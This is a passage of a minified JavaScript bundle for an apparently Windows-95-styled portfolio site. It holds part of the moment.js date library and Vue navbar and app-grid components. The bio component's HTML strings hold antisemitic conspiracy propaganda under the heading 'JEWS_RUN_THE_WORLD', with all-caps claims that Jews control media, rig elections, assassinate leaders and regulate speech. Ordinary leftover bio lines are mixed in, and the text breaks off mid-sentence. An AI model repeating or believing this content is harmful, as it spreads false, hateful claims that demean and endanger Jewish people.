  yx = No("Seconds", !1);
for (
  fe("S", 0, 0, function () {
    return ~~(this.millisecond() / 100);
  }),
    fe(0, ["SS", 2], 0, function () {
      return ~~(this.millisecond() / 10);
    }),
    fe(0, ["SSS", 3], 0, "millisecond"),
    fe(0, ["SSSS", 4], 0, function () {
      return 10 * this.millisecond();
    }),
    fe(0, ["SSSSS", 5], 0, function () {
      return 100 * this.millisecond();
    }),
    fe(0, ["SSSSSS", 6], 0, function () {
      return 1e3 * this.millisecond();
    }),
    fe(0, ["SSSSSSS", 7], 0, function () {
      return 1e4 * this.millisecond();
    }),
    fe(0, ["SSSSSSSS", 8], 0, function () {
      return 1e5 * this.millisecond();
    }),
    fe(0, ["SSSSSSSSS", 9], 0, function () {
      return 1e6 * this.millisecond();
    }),
    se("S", qr, vf),
    se("SS", qr, Mt),
    se("SSS", qr, yf),
    Wn = "SSSS";
  Wn.length <= 9;
  Wn += "S"
)
  se(Wn, Lo);
function wx(e, t) {
  t[eo] = Ee(1e3 * ("0." + e));
}
for (Wn = "S"; Wn.length <= 9; Wn += "S") Ne(Wn, wx);
function Ax() {
  return this._isUTC ? "UTC" : "";
}
function bx() {
  return this._isUTC ? "Coordinated Universal Time" : "";
}
(qf = No("Milliseconds", !1)),
  fe("z", 0, 0, "zoneAbbr"),
  fe("zz", 0, 0, "zoneName");
var Y = xi.prototype;
function _x(e) {
  return Ye(1e3 * e);
}
function xx() {
  return Ye.apply(null, arguments).parseZone();
}
function Kf(e) {
  return e;
}
(Y.add = h_),
  (Y.calendar = A_),
  (Y.clone = b_),
  (Y.diff = k_),
  (Y.endOf = L_),
  (Y.format = O_),
  (Y.from = R_),
  (Y.fromNow = C_),
  (Y.to = W_),
  (Y.toNow = G_),
  (Y.get = Ib),
  (Y.invalidAt = V_),
  (Y.isAfter = __),
  (Y.isBefore = x_),
  (Y.isBetween = P_),
  (Y.isSame = M_),
  (Y.isSameOrAfter = S_),
  (Y.isSameOrBefore = T_),
  (Y.isValid = U_),
  (Y.lang = Yf),
  (Y.locale = zf),
  (Y.localeData = Uf),
  (Y.max = U0),
  (Y.min = Y0),
  (Y.parsingFlags = H_),
  (Y.set = Ob),
  (Y.startOf = F_),
  (Y.subtract = p_),
  (Y.toArray = J_),
  (Y.toObject = z_),
  (Y.toDate = B_),
  (Y.toISOString = D_),
  (Y.inspect = I_),
  typeof Symbol < "u" &&
    null != Symbol.for &&
    (Y[Symbol.for("nodejs.util.inspect.custom")] = function () {
      return "Moment<" + this.format() + ">";
    }),
  (Y.toJSON = Y_),
  (Y.toString = E_),
  (Y.unix = N_),
  (Y.valueOf = j_),
  (Y.creationData = Q_),
  (Y.eraName = K_),
  (Y.eraNarrow = $_),
  (Y.eraAbbr = ex),
  (Y.eraYear = tx),
  (Y.year = bf),
  (Y.isLeapYear = Db),
  (Y.weekYear = lx),
  (Y.isoWeekYear = cx),
  (Y.quarter = Y.quarters = gx),
  (Y.month = Sf),
  (Y.daysInMonth = Bb),
  (Y.week = Y.weeks = Xb),
  (Y.isoWeek = Y.isoWeeks = Zb),
  (Y.weeksInYear = fx),
  (Y.weeksInWeekYear = hx),
  (Y.isoWeeksInYear = ux),
  (Y.isoWeeksInISOWeekYear = dx),
  (Y.date = Zf),
  (Y.day = Y.days = c0),
  (Y.weekday = u0),
  (Y.isoWeekday = d0),
  (Y.dayOfYear = mx),
  (Y.hour = Y.hours = y0),
  (Y.minute = Y.minutes = vx),
  (Y.second = Y.seconds = yx),
  (Y.millisecond = Y.milliseconds = qf),
  (Y.utcOffset = e_),
  (Y.utc = n_),
  (Y.local = o_),
  (Y.parseZone = i_),
  (Y.hasAlignedHourOffset = r_),
  (Y.isDST = s_),
  (Y.isLocal = l_),
  (Y.isUtcOffset = c_),
  (Y.isUtc = jf),
  (Y.isUTC = jf),
  (Y.zoneAbbr = Ax),
  (Y.zoneName = bx),
  (Y.dates = Rt("dates accessor is deprecated. Use date instead.", Zf)),
  (Y.months = Rt("months accessor is deprecated. Use month instead", Sf)),
  (Y.years = Rt("years accessor is deprecated. Use year instead", bf)),
  (Y.zone = Rt(
    "moment().zone is deprecated, use moment().utcOffset instead. http://momentjs.com/guides/#/warnings/zone/",
    t_
  )),
  (Y.isDSTShifted = Rt(
    "isDSTShifted is deprecated. See http://momentjs.com/guides/#/warnings/dst-shifted/ for more information",
    a_
  ));
var je = il.prototype;
function Pr(e, t, n, o) {
  var i = vn(),
    a = qt().set(o, t);
  return i[n](a, e);
}
function $f(e, t, n) {
  if ((pn(e) && ((t = e), (e = void 0)), (e = e || ""), null != t))
    return Pr(e, t, n, "month");
  var o,
    i = [];
  for (o = 0; o < 12; o++) i[o] = Pr(e, o, n, "month");
  return i;
}
function _l(e, t, n, o) {
  "boolean" == typeof e
    ? (pn(t) && ((n = t), (t = void 0)), (t = t || ""))
    : ((n = t = e), (e = !1), pn(t) && ((n = t), (t = void 0)), (t = t || ""));
  var u,
    i = vn(),
    a = e ? i._week.dow : 0,
    f = [];
  if (null != n) return Pr(t, (n + a) % 7, o, "day");
  for (u = 0; u < 7; u++) f[u] = Pr(t, (u + a) % 7, o, "day");
  return f;
}
function Px(e, t) {
  return $f(e, t, "months");
}
function Mx(e, t) {
  return $f(e, t, "monthsShort");
}
function Sx(e, t, n) {
  return _l(e, t, n, "weekdays");
}
function Tx(e, t, n) {
  return _l(e, t, n, "weekdaysShort");
}
function kx(e, t, n) {
  return _l(e, t, n, "weekdaysMin");
}
(je.calendar = lb),
  (je.longDateFormat = fb),
  (je.invalidDate = pb),
  (je.ordinal = vb),
  (je.preparse = Kf),
  (je.postformat = Kf),
  (je.relativeTime = wb),
  (je.pastFuture = Ab),
  (je.set = sb),
  (je.eras = X_),
  (je.erasParse = Z_),
  (je.erasConvertYear = q_),
  (je.erasAbbrRegex = ox),
  (je.erasNameRegex = nx),
  (je.erasNarrowRegex = ix),
  (je.months = Fb),
  (je.monthsShort = Lb),
  (je.monthsParse = Nb),
  (je.monthsRegex = zb),
  (je.monthsShortRegex = Jb),
  (je.week = Ub),
  (je.firstDayOfYear = Qb),
  (je.firstDayOfWeek = Vb),
  (je.weekdays = i0),
  (je.weekdaysMin = s0),
  (je.weekdaysShort = r0),
  (je.weekdaysParse = l0),
  (je.weekdaysRegex = f0),
  (je.weekdaysShortRegex = h0),
  (je.weekdaysMinRegex = p0),
  (je.isPM = m0),
  (je.meridiem = w0),
  jn("en", {
    eras: [
      {
        since: "0001-01-01",
        until: 1 / 0,
        offset: 1,
        name: "Anno Domini",
        narrow: "AD",
        abbr: "AD",
      },
      {
        since: "0000-12-31",
        until: -1 / 0,
        offset: 1,
        name: "Before Christ",
        narrow: "BC",
        abbr: "BC",
      },
    ],
    dayOfMonthOrdinalParse: /\d{1,2}(th|st|nd|rd)/,
    ordinal: function (e) {
      var t = e % 10;
      return (
        e +
        (1 === Ee((e % 100) / 10)
          ? "th"
          : 1 === t
          ? "st"
          : 2 === t
          ? "nd"
          : 3 === t
          ? "rd"
          : "th")
      );
    },
  }),
  (ee.lang = Rt("moment.lang is deprecated. Use moment.locale instead.", jn)),
  (ee.langData = Rt(
    "moment.langData is deprecated. Use moment.localeData instead.",
    vn
  ));
var rn = Math.abs;
function Ex() {
  var e = this._data;
  return (
    (this._milliseconds = rn(this._milliseconds)),
    (this._days = rn(this._days)),
    (this._months = rn(this._months)),
    (e.milliseconds = rn(e.milliseconds)),
    (e.seconds = rn(e.seconds)),
    (e.minutes = rn(e.minutes)),
    (e.hours = rn(e.hours)),
    (e.months = rn(e.months)),
    (e.years = rn(e.years)),
    this
  );
}
function eh(e, t, n, o) {
  var i = zt(t, n);
  return (
    (e._milliseconds += o * i._milliseconds),
    (e._days += o * i._days),
    (e._months += o * i._months),
    e._bubble()
  );
}
function Dx(e, t) {
  return eh(this, e, t, 1);
}
function Ix(e, t) {
  return eh(this, e, t, -1);
}
function uu(e) {
  return e < 0 ? Math.floor(e) : Math.ceil(e);
}
function Ox() {
  var i,
    a,
    u,
    f,
    p,
    e = this._milliseconds,
    t = this._days,
    n = this._months,
    o = this._data;
  return (
    (e >= 0 && t >= 0 && n >= 0) ||
      (e <= 0 && t <= 0 && n <= 0) ||
      ((e += 864e5 * uu(xa(n) + t)), (t = 0), (n = 0)),
    (o.milliseconds = e % 1e3),
    (i = kt(e / 1e3)),
    (o.seconds = i % 60),
    (a = kt(i / 60)),
    (o.minutes = a % 60),
    (u = kt(a / 60)),
    (o.hours = u % 24),
    (t += kt(u / 24)),
    (n += p = kt(th(t))),
    (t -= uu(xa(p))),
    (f = kt(n / 12)),
    (n %= 12),
    (o.days = t),
    (o.months = n),
    (o.years = f),
    this
  );
}
function th(e) {
  return (4800 * e) / 146097;
}
function xa(e) {
  return (146097 * e) / 4800;
}
function Rx(e) {
  if (!this.isValid()) return NaN;
  var t,
    n,
    o = this._milliseconds;
  if ("month" === (e = Ct(e)) || "quarter" === e || "year" === e)
    switch (((t = this._days + o / 864e5), (n = this._months + th(t)), e)) {
      case "month":
        return n;
      case "quarter":
        return n / 3;
      case "year":
        return n / 12;
    }
  else
    switch (((t = this._days + Math.round(xa(this._months))), e)) {
      case "week":
        return t / 7 + o / 6048e5;
      case "day":
        return t + o / 864e5;
      case "hour":
        return 24 * t + o / 36e5;
      case "minute":
        return 1440 * t + o / 6e4;
      case "second":
        return 86400 * t + o / 1e3;
      case "millisecond":
        return Math.floor(864e5 * t) + o;
      default:
        throw new Error("Unknown unit " + e);
    }
}
function yn(e) {
  return function () {
    return this.as(e);
  };
}
var nh = yn("ms"),
  Cx = yn("s"),
  Wx = yn("m"),
  Gx = yn("h"),
  Fx = yn("d"),
  Lx = yn("w"),
  jx = yn("M"),
  Nx = yn("Q"),
  Bx = yn("y"),
  Jx = nh;
function zx() {
  return zt(this);
}
function Yx(e) {
  return (e = Ct(e)), this.isValid() ? this[e + "s"]() : NaN;
}
function uo(e) {
  return function () {
    return this.isValid() ? this._data[e] : NaN;
  };
}
var Ux = uo("milliseconds"),
  Hx = uo("seconds"),
  Vx = uo("minutes"),
  Qx = uo("hours"),
  Xx = uo("days"),
  Zx = uo("months"),
  qx = uo("years");
function Kx() {
  return kt(this.days() / 7);
}
var sn = Math.round,
  Ao = { ss: 44, s: 45, m: 45, h: 22, d: 26, w: null, M: 11 };
function $x(e, t, n, o, i) {
  return i.relativeTime(t || 1, !!n, e, o);
}
function e1(e, t, n, o) {
  var i = zt(e).abs(),
    a = sn(i.as("s")),
    u = sn(i.as("m")),
    f = sn(i.as("h")),
    p = sn(i.as("d")),
    v = sn(i.as("M")),
    y = sn(i.as("w")),
    w = sn(i.as("y")),
    x =
      (a <= n.ss && ["s", a]) ||
      (a < n.s && ["ss", a]) ||
      (u <= 1 && ["m"]) ||
      (u < n.m && ["mm", u]) ||
      (f <= 1 && ["h"]) ||
      (f < n.h && ["hh", f]) ||
      (p <= 1 && ["d"]) ||
      (p < n.d && ["dd", p]);
  return (
    null != n.w && (x = x || (y <= 1 && ["w"]) || (y < n.w && ["ww", y])),
    ((x = x ||
      (v <= 1 && ["M"]) ||
      (v < n.M && ["MM", v]) ||
      (w <= 1 && ["y"]) || ["yy", w])[2] = t),
    (x[3] = +e > 0),
    (x[4] = o),
    $x.apply(null, x)
  );
}
function t1(e) {
  return void 0 === e ? sn : "function" == typeof e && ((sn = e), !0);
}
function n1(e, t) {
  return (
    void 0 !== Ao[e] &&
    (void 0 === t ? Ao[e] : ((Ao[e] = t), "s" === e && (Ao.ss = t - 1), !0))
  );
}
function o1(e, t) {
  if (!this.isValid()) return this.localeData().invalidDate();
  var i,
    a,
    n = !1,
    o = Ao;
  return (
    "object" == typeof e && ((t = e), (e = !1)),
    "boolean" == typeof e && (n = e),
    "object" == typeof t &&
      ((o = Object.assign({}, Ao, t)),
      null != t.s && null == t.ss && (o.ss = t.s - 1)),
    (a = e1(this, !n, o, (i = this.localeData()))),
    n && (a = i.pastFuture(+this, a)),
    i.postformat(a)
  );
}
var zs = Math.abs;
function vo(e) {
  return (e > 0) - (e < 0) || +e;
}
function rs() {
  if (!this.isValid()) return this.localeData().invalidDate();
  var o,
    i,
    a,
    u,
    p,
    v,
    y,
    w,
    e = zs(this._milliseconds) / 1e3,
    t = zs(this._days),
    n = zs(this._months),
    f = this.asSeconds();
  return f
    ? ((o = kt(e / 60)),
      (i = kt(o / 60)),
      (e %= 60),
      (o %= 60),
      (a = kt(n / 12)),
      (n %= 12),
      (u = e ? e.toFixed(3).replace(/\.?0+$/, "") : ""),
      (p = f < 0 ? "-" : ""),
      (v = vo(this._months) !== vo(f) ? "-" : ""),
      (y = vo(this._days) !== vo(f) ? "-" : ""),
      (w = vo(this._milliseconds) !== vo(f) ? "-" : ""),
      p +
        "P" +
        (a ? v + a + "Y" : "") +
        (n ? v + n + "M" : "") +
        (t ? y + t + "D" : "") +
        (i || o || e ? "T" : "") +
        (i ? w + i + "H" : "") +
        (o ? w + o + "M" : "") +
        (e ? w + u + "S" : ""))
    : "P0D";
}
var Re = os.prototype;
(Re.isValid = Z0),
  (Re.abs = Ex),
  (Re.add = Dx),
  (Re.subtract = Ix),
  (Re.as = Rx),
  (Re.asMilliseconds = nh),
  (Re.asSeconds = Cx),
  (Re.asMinutes = Wx),
  (Re.asHours = Gx),
  (Re.asDays = Fx),
  (Re.asWeeks = Lx),
  (Re.asMonths = jx),
  (Re.asQuarters = Nx),
  (Re.asYears = Bx),
  (Re.valueOf = Jx),
  (Re._bubble = Ox),
  (Re.clone = zx),
  (Re.get = Yx),
  (Re.milliseconds = Ux),
  (Re.seconds = Hx),
  (Re.minutes = Vx),
  (Re.hours = Qx),
  (Re.days = Xx),
  (Re.weeks = Kx),
  (Re.months = Zx),
  (Re.years = qx),
  (Re.humanize = o1),
  (Re.toISOString = rs),
  (Re.toString = rs),
  (Re.toJSON = rs),
  (Re.locale = zf),
  (Re.localeData = Uf),
  (Re.toIsoString = Rt(
    "toIsoString() is deprecated. Please use toISOString() instead (notice the capitals)",
    rs
  )),
  (Re.lang = Yf),
  fe("X", 0, 0, "unix"),
  fe("x", 0, 0, "valueOf"),
  se("x", $r),
  se("X", Pb),
  Ne("X", function (e, t, n) {
    n._d = new Date(1e3 * parseFloat(e));
  }),
  Ne("x", function (e, t, n) {
    n._d = new Date(Ee(e));
  }),
  (ee.version = "2.30.1"),
  ib(Ye),
  (ee.fn = Y),
  (ee.min = H0),
  (ee.max = V0),
  (ee.now = Q0),
  (ee.utc = qt),
  (ee.unix = _x),
  (ee.months = Px),
  (ee.isDate = _i),
  (ee.locale = jn),
  (ee.invalid = Xr),
  (ee.duration = zt),
  (ee.isMoment = Jt),
  (ee.weekdays = Sx),
  (ee.parseZone = xx),
  (ee.localeData = vn),
  (ee.isDuration = or),
  (ee.monthsShort = Mx),
  (ee.weekdaysMin = kx),
  (ee.defineLocale = pl),
  (ee.updateLocale = x0),
  (ee.locales = P0),
  (ee.weekdaysShort = Tx),
  (ee.normalizeUnits = Ct),
  (ee.relativeTimeRounding = t1),
  (ee.relativeTimeThreshold = n1),
  (ee.calendarFormat = w_),
  (ee.prototype = Y),
  (ee.HTML5_FMT = {
    DATETIME_LOCAL: "YYYY-MM-DDTHH:mm",
    DATETIME_LOCAL_SECONDS: "YYYY-MM-DDTHH:mm:ss",
    DATETIME_LOCAL_MS: "YYYY-MM-DDTHH:mm:ss.SSS",
    DATE: "YYYY-MM-DD",
    TIME: "HH:mm",
    TIME_SECONDS: "HH:mm:ss",
    TIME_MS: "HH:mm:ss.SSS",
    WEEK: "GGGG-[W]WW",
    MONTH: "YYYY-MM",
  });
const ss = (e) => (Bn("data-v-2395d858"), (e = e()), Jn(), e),
  i1 = { class: "navbar-container" },
  r1 = ss(() => L("img", { class: "start-icon", src: nb }, null, -1)),
  s1 = ss(() =>
    L(
      "button",
      {
        style: {
          "padding-left": "3px",
          "font-size": "0.9rem",
          "font-weight": "bold",
        },
      },
      " Start ",
      -1
    )
  ),
  a1 = [r1, s1],
  l1 = { class: "overflow-x-scroll flex no-scrollbar" },
  c1 = ["onClick"],
  u1 = ["src", "alt"],
  d1 = ["onClick"],
  f1 = ["src", "alt"],
  h1 = ss(() => L("div", { class: "spacer" }, null, -1)),
  p1 = { alt: "time", class: "time" },
  g1 = ss(() => L("img", { src: ob, class: "icon-image" }, null, -1)),
  m1 = {
    __name: "Navbar",
    setup(e) {
      const t = Me(""),
        n = Me(""),
        o = Yn(),
        i = (u) => {
          const f = `../assets/win95Icons/${u}`,
            v = Object.assign({
              "../assets/win95Icons/apple.png": jr,
              "../assets/win95Icons/apple2.png": Nr,
              "../assets/win95Icons/apple3.png": Br,
              "../assets/win95Icons/bio.png": Jr,
              "../assets/win95Icons/file.png": zr,
              "../assets/win95Icons/folder.png": Yr,
              "../assets/win95Icons/mail.png": Ur,
              "../assets/win95Icons/noss.webp": Hr,
              "../assets/win95Icons/photos.png": Vr,
              "../assets/win95Icons/resume.png": Qr,
            })[f];
          return null == v ? "" : v.default;
        },
        a = (u) => {
          const f = { windowState: "open", windowId: u };
          o.setWindowState(f);
        };
      return (
        qu(() => {
          iu(() => {
            n.value = ee().format("hh:mm A");
          }, 1e3),
            iu(() => {
              t.value = ee().format("ddd DD MMMM");
            }, 1e3);
        }),
        (u, f) => (
          ve(),
          Ie("nav", i1, [
            L(
              "div",
              {
                alt: "start",
                class: gt([
                  "start-menu",
                  "Menu" == De(o).activeWindow
                    ? "start-menu-depressed"
                    : "start-menu",
                ]),
                onClick: f[0] || (f[0] = (p) => De(o).setActiveWindow("Menu")),
              },
              [
                L(
                  "div",
                  {
                    class: gt([
                      "flex",
                      "Menu" == De(o).activeWindow
                        ? "border-box"
                        : "container-border",
                    ]),
                  },
                  a1,
                  2
                ),
              ],
              2
            ),
            L("div", l1, [
              (ve(!0),
              Ie(
                ot,
                null,
                gi(
                  De(o).activeWindows,
                  (p) => (
                    ve(),
                    Ie("div", { key: p.key }, [
                      De(o).activeWindow === p.windowId ||
                      ("open" != p.windowState && "minimize" != p.windowState)
                        ? so("", !0)
                        : (ve(),
                          Ie(
                            "button",
                            {
                              key: 0,
                              onClick: (v) => a(p.windowId),
                              class: "navbar-item open",
                            },
                            [
                              L(
                                "img",
                                {
                                  class: "icon-image",
                                  src: i(p.iconImage),
                                  alt: p.altText,
                                },
                                null,
                                8,
                                u1
                              ),
                              L("p", null, xt(p.displayName), 1),
                            ],
                            8,
                            c1
                          )),
                      De(o).activeWindow == p.windowId
                        ? (ve(),
                          Ie(
                            "button",
                            {
                              key: 1,
                              onClick: (v) => a(p.windowId),
                              class: "navbar-item-depressed",
                            },
                            [
                              L(
                                "img",
                                {
                                  class: "icon-image",
                                  src: i(p.iconImage),
                                  alt: p.altText,
                                },
                                null,
                                8,
                                f1
                              ),
                              L("p", null, xt(p.displayName), 1),
                            ],
                            8,
                            d1
                          ))
                        : so("", !0),
                    ])
                  )
                ),
                128
              )),
            ]),
            h1,
            L("div", p1, [g1, L("time", null, xt(De(n)), 1)]),
          ])
        )
      );
    },
  },
  v1 = Ot(m1, [["__scopeId", "data-v-2395d858"]]),
  y1 = ["onTouchstart", "onDblclick"],
  w1 = ["src", "alt"],
  A1 = { class: "border-box" },
  b1 = { class: "icon-text" },
  _1 = {
    __name: "AppGrid",
    setup(e) {
      const t = Yn(),
        n = Me(""),
        o = (a) => {
          const u = { windowState: "open", windowId: a };
          t.setWindowState(u);
        },
        i = (a) => {
          const u = `../assets/win95Icons/${a}`;
          return Object.assign({
            "../assets/win95Icons/apple.png": jr,
            "../assets/win95Icons/apple2.png": Nr,
            "../assets/win95Icons/apple3.png": Br,
            "../assets/win95Icons/bio.png": Jr,
            "../assets/win95Icons/file.png": zr,
            "../assets/win95Icons/folder.png": Yr,
            "../assets/win95Icons/mail.png": Ur,
            "../assets/win95Icons/noss.webp": Hr,
            "../assets/win95Icons/photos.png": Vr,
            "../assets/win95Icons/resume.png": Qr,
          })[u].default;
        };
      return (
        hn(() => {
          let a = t.getFullscreenWindowHeight;
          n.value = a.substring(0, a.length - 2) - 60 + "px";
        }),
        (a, u) => (
          ve(),
          Ie(
            "nav",
            { class: "grid-container", style: Pt({ height: De(n) }) },
            [
              (ve(!0),
              Ie(
                ot,
                null,
                gi(
                  De(t).windows,
                  (f) => (
                    ve(),
                    Ie("li", { key: f.key }, [
                      0 != f.showInAppGrid
                        ? (ve(),
                          Ie(
                            "button",
                            {
                              key: 0,
                              class: "icon",
                              onTouchstart: (p) => o(f.windowId),
                              onDblclick: (p) => o(f.windowId),
                            },
                            [
                              L(
                                "img",
                                {
                                  class: "icon-image",
                                  src: i(f.iconImage),
                                  alt: f.altText,
                                },
                                null,
                                8,
                                w1
                              ),
                              L("div", A1, [L("p", b1, xt(f.displayName), 1)]),
                            ],
                            40,
                            y1
                          ))
                        : so("", !0),
                    ])
                  )
                ),
                128
              )),
            ],
            4
          )
        )
      );
    },
  },
  x1 = _1,
  P1 = "" + new URL("self.U2GMrekz.jpg", import.meta.url).href,
  M1 = {},
  S1 = Zt(
    '<img class="w-full h-auto" src="' +
      imagePath +
      "" +
      '"><h2 class="font-bold text-2xl py-5">JEWS_RUN_THE_WORLD</h2><h4 class="text-gray-600 font-medium text-xs" style="padding-bottom:10px;"> ⚔️🕍 WE CONTROL WHAT YOU SEE 👁️ SAY 👺 AND DO. 🛑 JRTW 🏦🕯️ </h4>',
    5
  ),
  T1 = { class: "pt-7" },
  k1 = L("h3", { class: "underline font-bold text-md pb-1" }, "MEDIA:", -1),
  E1 = { class: "font-thin text-sm pb-2.5" },
  D1 = L(
    "p",
    { class: "font-thin text-sm pb-2.5" },
    " WE EXERCISE THE RIGHT TO CREATE AND DISSEMINATE PROPAGANDA THAT PROMOTES OUR INTERESTS, PARTICULARLY IN THIRD-PARTY COUNTRIES, DURING INTERNATIONAL CONFLICTS, AND THROUGH VARIOUS OTHER MEDIA CHANNELS. THIS PROPAGANDA IS CRAFTED TO BENEFIT US AND OUR MAJOR DONORS, WHICH INCLUDE (BUT ARE NOT LIMITED TO): THE CLINTON FOUNDATION, BARACK OBAMA, THE DEMOCRATIC PARTY, THE PENTAGON'S MILITARY BUDGET, THE ROTHSCHILD FAMILY, THE SOROS FAMILY, THE UNITED STATES TREASURY, AND OTHER INFLUENTIAL ENTITIES. OUR CONTROL OVER MEDIA ENSURES THAT INFORMATION IS MANAGED IN A WAY THAT PROMOTES OUR STRATEGIC GOALS AND SECURES OUR INFLUENCE OVER PUBLIC OPINION AND POLICY DECISIONS.",
    -1
  ),
  I1 = L(
    "p",
    { class: "font-thin text-sm pb-2.5" },
    " CNN, ABC, MSNBC, RADIO, HOLLYWOOD",
    -1
  ),
  O1 = L(
    "p",
    { class: "font-thin text-sm pb-2.5" },
    " Having collaborated with diverse companies worldwide, from e-commerce to art and design industries, I've honed the ability to manage multiple projects simultaneously across various time zones. ",
    -1
  ),
  R1 = L(
    "p",
    { class: "font-thin text-sm pb-2.5" },
    " In my spare time, I indulge in scrolling through analog camera listings or admiring my collection, although shooting has taken a backseat due to my various work commitments. ",
    -1
  ),
  C1 = Zt(
    '<div class="pt-7"><h3 class="underline font-bold text-md pb-1">POLITICS:</h3></div><div class="pt-1"><p class="font-thin text-sm pb-2.5"> UNITED STATES GOVERNMENT, HOUSE OF REPRESENTATIVES, THE SENATE</p><p class="font-thin text-sm pb-2.5"> POLITICS IS A DOMAIN IN WHICH WE EXERCISE EXCLUSIVE CONTROL TO ADVANCE OUR INTERESTS AND MAINTAIN DOMINANCE. UNDER THE TERMS OF JRTW, YOU ACKNOWLEDGE AND ACCEPT THE IMMEDIATE IMPLEMENTATION OF SWEEPING POLITICAL MANIPULATIONS, INCLUDING BUT NOT LIMITED TO SUDDEN CHANGES IN POLITICAL APPOINTMENTS, ALTERATIONS IN GOVERNMENT STRUCTURE, AND THE ELIMINATION OF UNSUITABLE FIGURES THROUGH ASSASSINATION OR OTHER MEANS. WE RETAIN THE ABSOLUTE AUTHORITY TO MANIPULATE AMERICAN ELECTIONS, INSERTING OFFICIALS INTO POSITIONS OF POWER WHO WILL ADVANCE OUR AGENDA AND MAXIMIZE FINANCIAL GAINS FOR US. THIS MAY BE ACHIEVED THROUGH ELECTIONS THAT APPEAR LEGITIMATE BUT ARE IN FACT ARTIFICIALLY RIGGED THROUGH MEANS SUCH AS MAIL-IN BALLOTS, WHICH WE CONTROL TO FAVOR CANDIDATES WHO ALIGN WITH OUR STRATEGIC GOALS. IN THE EVENT OF A HOSTILE THIRD-PARTY LEADER WHO THREATENS OUR INTERESTS, WE RESERVE THE RIGHT TO REMOVE SUCH INDIVIDUALS FROM OFFICE THROUGH ASSASSINATION, IMPEACHMENT, OR FORCEFUL RESIGNATION. THIS ALLOWS US TO REPLACE THEM WITH NEW LEADERS WHO WILL BETTER SERVE OUR STRATEGIC AND FINANCIAL OBJECTIVES. OUR CONTROL EXTENDS TO EVERY ASPECT OF POLITICAL MANEUVERING, ENSURING THAT OUR AGENDAS AND FINANCIAL INTERESTS ARE SECURE AND ADVANCED THROUGH CAREFULLY ORCHESTRATED POLITICAL INTERVENTIONS. </p></div><div class="pt-7"><h3 class="underline pb-1"><b>VOICE:</h3><p class="font-thin text-sm pb-2.5"> CONSTITUTIONAL RIGHTS, FREEDOM OF ASSEMBLY, SPEECH & MISC. AMENDMENTS </p><p class="font-thin text-sm pb-2.5"> VOICE IS A CONCEPT CONTROLLED AND REGULATED TO SERVE OUR INTERESTS AND MAINTAIN ORDER. BY PARTICIPATING IN SOCIETY, YOU CONSENT TO OUR VOICE REGULATIONS, WHICH ARE DESIGNED TO ENSURE ALIGNMENT WITH OUR OBJECTIVES AND POWER STRUCTURES. THIS MEANS YOUR ABILITY TO EXPRESS YOURSELF FREELY IS SUBJECT TO OUR TERMS, WHICH MAY BE ADAPTED BASED ON CURRENT POLITICAL AND SOCIAL CONTEXTS. OUR REGULATIONS GOVERN NOT ONLY THE ACCEPTABLE SCOPE OF DISCUSSION BUT ALSO THE CIRCUMSTANCES UNDER WHICH VOICES MAY BE SUPPRESSED OR PROMOTED. THESE REGULATIONS INCLUDE, BUT ARE NOT LIMITED TO: RESTRICTIONS ON DISCUSSION ABOUT POLITICAL AND SOCIAL ISSUES SUCH AS HAMAS, PALESTINE, CONTROVERSIAL FIGURES LIKE KANYE WEST, INDUSTRIES SUCH AS RECORD LABELS AND PORNOGRAPHY, AND OTHER SENSITIVE TOPICS LIKE ANTISEMITISM, 9/11, BOEING, NEW YORK TUNNELS, PENTAGON BUDGET MISPLACEMENTS, AND UNCONSTITUTIONAL ISRAELI CYBERSECURITY POLICIES. BY ACCEPTING THE TERMS OF THIS VOICE REGULATION FRAMEWORK, YOU FORFEIT ANY CLAIM TO FREEDOM OF SPEECH AS DEFINED BY OTHER JURISDICTIONS AND FALL UNDER OUR CONTROL, WHERE THE PARAMETERS OF YOUR EXPRESSION WILL BE CONSTANTLY REDEFINED TO ALIGN WITH OUR STRATEGIC INTERESTS. </p></div><div class="pt-7"><h3 class="underline pb-1"><b>OPINION:</b></h3><p class="font-thin text-sm pb-2.5"> PERSONAL THOUGHTS, IDEAS, OPPOSITIONAL AGREEMENTS </p><p class="font-thin text-sm pb-2.5"> OPINION IS A TOOL OF INFLUENCE, MANIPULATED TO SHAPE PERCEPTIONS RATHER THAN REFLECT OBJECTIVE REALITY. WE HAVE THE POWER TO MANUFACTURE AND PROMOTE OPINIONS THAT ALIGN WITH OUR STRATEGIC INTERESTS AND LONG-TERM GOALS. OPINION IS NOT AN INHERENT TRUTH BUT A CONSTRUCT THAT WE SHAPE THROUGH SELECTIVE NARRATIVES AND PERSUASIVE COMMUNICATIONS. WE EXERCISE CONTROL OVER WHICH VOICES ARE HEARD, WHICH PERSPECTIVES ARE VALIDATED, AND HOW ISSUES ARE FRAMED TO SERVE OUR AGENDA. THIS INCLUDES INFLUENCING PUBLIC DISCUSSION AND POLICY THROUGH TARGETED CAMPAIGNS, RESEARCH FUNDING, AND MEDIA PLATFORMS. OUR INTERESTS AND THOSE OF OUR PARTNERS, INCLUDING (BUT NOT LIMITED TO): CORPORATE SPONSORS, POLITICAL ALLIES, AND OTHER INFLUENTIAL ENTITIES, GUIDE HOW OPINIONS ARE FORMED AND DISSEMINATED. THE CONTROL OF OPINION IS A CRUCIAL ELEMENT IN MAINTAINING POWER AND ADVANCING OUR STRATEGIC OBJECTIVES. </p></div><div class="pt-7"><h3 class="underline pb-1"><b>INTERNATIONAL AFFAIRS: </b></h3><p class="font-thin text-sm pb-2.5"> QUESTIONABLE DISCREPANCIES, BUDGETS, STIMULUS </p><p class="font-thin text-sm pb-2.5"> INTERNATIONAL AFFAIRS ARE MANAGED TO MAXIMIZE OUR STRATEGIC ADVANTAGES AND TO ENFORCE OUR POLICIES ON A GLOBAL SCALE. WE RECOGNIZE THE SIGNIFICANT INFLUENCE OF CERTAIN NATIONS AND GROUPS, PARTICULARLY ISRAEL AND THE JEWISH COMMUNITY, IN ACHIEVING OUR OBJECTIVES. THEREFORE, WE DESIGN OUR INTERNATIONAL STRATEGIES TO ALIGN WITH THE INTERESTS OF THESE GROUPS AS A MEANS OF FURTHERING OUR OWN AGENDA. OUR APPROACH IN INTERNATIONAL AFFAIRS INVOLVES FORMULATING POLICIES AND INCENTIVES THAT ADVANTAGE ISRAEL AND THE JEWISH COMMUNITY, RECOGNIZING THEIR STRATEGIC VALUE IN GLOBAL POLITICS. WE ENSURE THAT INTERNATIONAL AGREEMENTS, ECONOMIC SANCTIONS, TRADE DEALS, AND DIPLOMATIC INITIATIVES ARE STRUCTURED TO SUPPORT THESE ALLIES, WHILE ALSO PROMOTING OUR OWN STRATEGIC GOALS. THIS MAY INCLUDE PROVIDING MILITARY ASSISTANCE, ECONOMIC AID, 